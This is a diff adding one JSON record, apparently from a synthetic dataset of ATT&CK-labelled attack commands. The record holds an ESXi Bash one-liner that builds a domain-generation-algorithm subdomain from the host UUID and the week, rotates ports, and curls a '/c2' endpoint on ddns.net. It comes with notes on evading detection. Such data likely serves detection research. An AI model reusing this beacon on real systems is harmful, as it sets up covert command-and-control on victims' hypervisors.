@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=\"$(esxcli system uuid get 2>/dev/null || hostname -s)$(date -u +%Y%W)\"; sub=$(echo -n \"$seed\" | sha1sum | cut -c1-18); dom=\"$sub.ddns.net\"; ports=(443 8443 10443 16443); port=\"${ports[$(($(date -u +%S) % ${#ports[@]}))]}\"; curl --retry 1 --connect-timeout 4 \"https://$dom:$port/c2\"",
+  "explanation": "Uses the ESXi host UUID combined with the week to produce a deterministic DGA domain and rotates among a small set of ports to evade static detection. This exemplifies dynamic DNS/DGA usage under T1568.",
+  "rationale_steps": [
+    "Acquire a stable host UUID (fallback to hostname).",
+    "Hash with the current week to produce a predictable DGA label.",
+    "Pick a port from a rotating list based on seconds.",
+    "Attempt a curl connection to the dynamically resolved domain."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-560f0702",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
